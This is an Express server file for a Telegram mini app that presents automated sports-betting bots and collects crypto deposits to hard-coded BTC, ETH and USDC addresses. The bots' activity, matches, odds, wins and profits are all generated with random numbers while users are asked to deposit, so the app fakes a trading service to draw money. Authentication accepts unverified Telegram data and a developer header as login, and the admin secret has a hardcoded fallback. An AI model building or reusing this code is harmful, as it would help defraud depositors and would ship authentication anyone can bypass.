import express from 'express'
import cors from 'cors'
import { randomUUID } from 'crypto'
import { db } from './db.js'

const app = express()
const PORT = process.env.PORT || 3001
const ADMIN_SECRET = process.env.ADMIN_SECRET || 'muda-isto-para-um-segredo-forte'

const DEPOSIT_ADDRESSES = {
  BTC: '175DBVQbmokQFmbP1xXvChpmQxwCLeiDim',
  ETH: '0x253b6EA9a69D60400C5170022362eebd442bEdF9',
  USDC: '0x253b6EA9a69D60400C5170022362eebd442bEdF9',
}

const BOT_STATUSES = ['idle', 'scanning', 'entry_found', 'in_trade', 'win', 'loss']
const MATCH_POOL = [
  'Arsenal vs Tottenham', 'Man City vs Liverpool', 'Real Madrid vs Valencia',
  'Barcelona vs Atletico', 'Bayern vs Leverkusen', 'Dortmund vs Leipzig',
  'Inter vs Roma', 'Juventus vs Napoli', 'PSG vs Lyon', 'Benfica vs Sporting',
]

app.use(cors())
app.use(express.json())

function getTgUser(req) {
  const initData = req.headers['x-telegram-init-data']
  if (initData) {
    try {
      const params = new URLSearchParams(initData)
      const userStr = params.get('user')
      if (userStr) return JSON.parse(userStr)
    } catch (e) {}
  }
  const devId = req.headers['x-dev-telegram-id']
  if (devId) return { id: devId, first_name: 'Dev', username: 'dev' }
  return null
}

function getOrCreateUser(tg) {
  const data = db.get()
  let user = data.users.find(function (u) { return u.telegram_id === String(tg.id) })
  if (user) return user
  user = {
    id: randomUUID(),
    telegram_id: String(tg.id),
    username: tg.username || null,
    first_name: tg.first_name || null,
    balance: 50,
    total_profit: 0,
    created_at: Date.now(),
  }
  data.users.push(user)
  db.save()
  return user
}

function auth(req, res, next) {
  const tg = getTgUser(req)
  if (!tg) return res.status(401).json({ error: 'Unauthorized' })
  req.user = getOrCreateUser(tg)
  next()
}

function admin(req, res, next) {
  if (req.headers['x-admin-secret'] !== ADMIN_SECRET) {
    return res.status(403).json({ error: 'Forbidden' })
  }
  next()
}

const liveBots = {}

function ensureLiveBots() {
  const data = db.get()
  const active = data.bots.filter(function (b) { return b.active })
  const ids = {}
  active.forEach(function (b) { ids[b.id] = true })
  Object.keys(liveBots).forEach(function (id) {
    if (!ids[id]) delete liveBots[id]
  })
  active.forEach(function (b) {
    if (!liveBots[b.id]) {
      liveBots[b.id] = {
        id: b.id,
        name: b.name,
        league: b.league,
        stake: b.stake,
        active: b.active,
        status: 'scanning',
        currentMatch: null,
        odd: 0,
        profit: null,
        lastUpdate: Date.now(),
      }
    }
  })
}

ensureLiveBots()

setInterval(function () {
  ensureLiveBots()
  Object.keys(liveBots).forEach(function (id) {
    if (Math.random() > 0.5) return
    const bot = liveBots[id]
    const idx = BOT_STATUSES.indexOf(bot.status)
    const next = BOT_STATUSES[(idx + 1) % BOT_STATUSES.length]
    bot.status = next
    bot.lastUpdate = Date.now()
    if (next === 'entry_found' || next === 'in_trade') {
      bot.currentMatch = MATCH_POOL[Math.floor(Math.random() * MATCH_POOL.length)]
      bot.odd = +(1.45 + Math.random() * 1.1).toFixed(2)
    }
    if (next === 'win') bot.profit = +(bot.stake * (bot.odd - 1)).toFixed(2)
    if (next === 'loss') bot.profit = -bot.stake
    if (next === 'idle' || next === 'scanning') {
      bot.currentMatch = null
      bot.profit = null
      bot.odd = 0
    }
  })
}, 5000)

app.get('/api/health', function (req, res) {
  res.json({ ok: true, time: Date.now() })
})

app.get('/api/deposit-addresses', function (req, res) {
  res.json(DEPOSIT_ADDRESSES)
})

app.get('/api/me', auth, function (req, res) {
  const data = db.get()
  const txs = data.transactions
    .filter(function (t) { return t.user_id === req.user.id })
    .sort(function (a, b) { return b.created_at - a.created_at })
    .slice(0, 40)
  res.json({
    id: req.user.id,
    firstName: req.user.first_name,
    username: req.user.username,
    balance: req.user.balance,
    totalProfit: req.user.total_profit,
    transactions: txs,
  })
})

app.get('/api/bots/live', auth, function (req, res) {
  ensureLiveBots()
  res.json(Object.keys(liveBots).map(function (id) { return liveBots[id] }))
})

app.get('/api/history', auth, function (req, res) {
  res.json(db.get().match_history)
})

app.post('/api/deposit-request', auth, function (req, res) {
  const coin = req.body.coin
  const amount = req.body.amount
  const txHash = req.body.txHash
  if (['BTC', 'ETH', 'USDC'].indexOf(coin) < 0) {
    return res.status(400).json({ error: 'Invalid coin' })
  }
  const data = db.get()
  const id = randomUUID()
  data.deposit_requests.push({
    id: id,
    user_id: req.user.id,
    coin: coin,
    amount: amount || null,
    tx_hash: txHash || null,
    status: 'pending',
    created_at: Date.now(),
  })
  db.save()
  res.json({ ok: true, id: id })
})
